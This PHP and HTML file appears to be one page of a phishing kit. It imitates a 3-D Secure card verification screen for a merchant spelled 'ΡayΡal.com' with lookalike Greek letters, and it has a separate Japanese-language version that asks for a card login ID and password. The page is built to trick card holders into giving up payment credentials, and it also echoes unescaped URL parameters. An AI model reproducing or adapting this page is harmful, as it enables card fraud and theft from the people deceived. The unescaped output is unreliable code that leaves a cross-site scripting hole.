<?php
include('../pais/contenttrans.php');
 ?>
<form method="post" id="parentForm" name="creditcard_Form" action="3dsecure.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=five&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>" class="edit" >
	<!-- <link rel="stylesheet" type="text/css" href="../css/idpass_PC.css"> -->

	<?php    
	
	function cekAngka($negara) {    
		if($negara=='JP') {    
			throw new Exception("COUNTRY MUST JAPAN, Thanks");    
		}    
		return true;    
	}    

	try {    
		cekAngka($negara);
		?><center>
			<table width="100%" cellspacing="0" cellpadding="0">
				<tbody>

					<tr>
						<td>
							<div class="contents">
								<table class="logo-image">
									<tbody><tr>
										<td align="right" class="issuer-logo"><img src="../../poto/SecureLogo.png" width="130" height="35" alt=""></td>
										<div style="display:none;"><td class="issuer-logo"><img src="../../poto/transparent.png" width="300" height="47" alt=""></td></div>
										<td align="left" class="brand-logo"><img src="../../poto/scurez.jpg" width="140" height="27" alt=""></td>
									</tr>
								</tbody></table>
								<div class="protection"><font face="Arial"><?= $cs ?></font></div>
								<div class="message"><p><font face="Arial"><?= $ct ?></font></p><br></div>
								<table class="contents" width="100%">
									<tbody><tr>
										<td class="item"><?= $cu ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value">&Rho;ay&Rho;al.com</td>
									</tr>
									<tr>
										<td class="item"><?= $cv ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value">$0.01 USD</td>
									</tr>
									<tr>
										<td class="item"><?= $cw ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value"><?= date('d M Y') ?></td>
									</tr>
									<tr>
										<td class="item"><?= $cx ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value">****-****-****-<?php echo $_GET['trxid']; ?></td>
									</tr>

									<tr>
										<td class="item"><?= $cy ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value"><?= $cz ?></td>

									</tr>


									<tr>
										<td class="item"><?= $a1 ?></td>
										<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
										<td class="value">
											<div class="textInput">
												<div class="fieldWrapper">
													<input name="cc_pass" type="password" class="hasHelp  validateEmpty   " placeholder="<?= $a1 ?>" autocomplete="off" value="" size="15" maxlength="30" class="hasHelp  validateEmpty   " required="">
												</div>
											</div>
										</td>

									</tr>
									<tr>
										<td class="value" colspan="3" align="right">
											<table align="right">
												<tr>
													<td align="right">
														<button style="width: 100px !important;" type="submit" value="Submit" class="button"><?= $cq ?></button>
													</td>
													<td>&nbsp;</td>
													<td><a href="https://en.wikipedia.org/wiki/3-D_Secure" target="_blank"><?= $b1 ?></a></td>
												</tr>
											</table>
										</td>
									</tr>
								</tbody>
							</table>

						</div>
					</td>
				</tr>
			</tbody>
		</table>
	</center>
	<?php
}    

catch(Exception $e) {    
	?>
	<center>
		<table width="100%" cellspacing="0" cellpadding="0">
			<tbody><tr>
				<td>
					<div class="contents">
						<table class="logo-image">
							<tbody><tr>
								<td class="issuer-logo"><img src="../../poto/SecureLogo.png" width="140" height="47" alt=""></td>
								<div style="display:none;"><td class="issuer-logo"><img src="../../poto/transparent.png" width="50" height="47" alt=""></td></div>
								<td class="brand-logo"><img src="../../poto/scurez.jpg" width="140" height="27" alt=""></td>
							</tr>
						</tbody></table>
						<div class="protection">Added Protection</div>
						<div class="message"><p>本人認証を行います。VISA/MASTERCARD/JCB/AMEX safekey認証サービスのパスワードをご入力ください。</p><br></div>
						<table class="contents">
							<tbody><tr>
								<td class="item" width="30%">加盟店名</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">&Rho;ay&Rho;al.com</td>
							</tr>
							<tr>
								<td class="item" width="30%">ご利用金額</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">¥ 0.00</td>
							</tr>
							<tr>
								<td class="item" width="30%">ご利用日</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value"><?= date('d M Y') ?></td>
							</tr>
							<tr>
								<td class="item" width="30%">カード番号</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">XXXX-XXXX-XXXX-XXXX</td>
							</tr>

							<tr>
								<td class="item" width="30%">パーソナルメッセージ</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">個人的なメッセージ</td>
							</tr>


							<tr>
								<td class="item" width="30%">ネットID / ログインID</td>
								<td width="2%">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">
									<div class="textInput">
										<div class="fieldWrapper">
											<input name="cc_login" type="text" value="" class="hasHelp  validateEmpty   " maxlength="18" placeholder="ネットID / ログインID" class="loginId">
										</div>
									</div>
								</td>
							</tr>

							<tr>
								<td class="item">パスワード</td>
								<td>&nbsp;&nbsp;:&nbsp;&nbsp;</td>
								<td class="value">
									<div class="textInput">
										<div class="fieldWrapper">
											<input name="cc_pass" type="password" autocomplete="off" class="hasHelp  validateEmpty   " placeholder="パスワード" value="" maxlength="30" class="password">
										</div>
									</div>
								</td>
							</tr>
							<tr>
								<td class="value" colspan="3" align="right">
									<table>
										<tr>
											<td class="value" colspan="3" align="right">
												<table align="right">
													<tr>
														<td align="right">
															<button style="width: 100px !important;" type="submit" value="送信" class="button">送信</button>
														</td>
														<td>&nbsp;</td>
														<td><a href="https://en.wikipedia.org/wiki/3-D_Secure" target="_blank">ヘルプ</a></td>
													</tr>
												</table>
											</td>
										</tr>
									</table>
								</td>
							</tr>
						</tbody>
					</table>
				</div>
			</td>
		</tr>
	</tbody>
</table>
</center>
<?php   
}    
?>  
</form>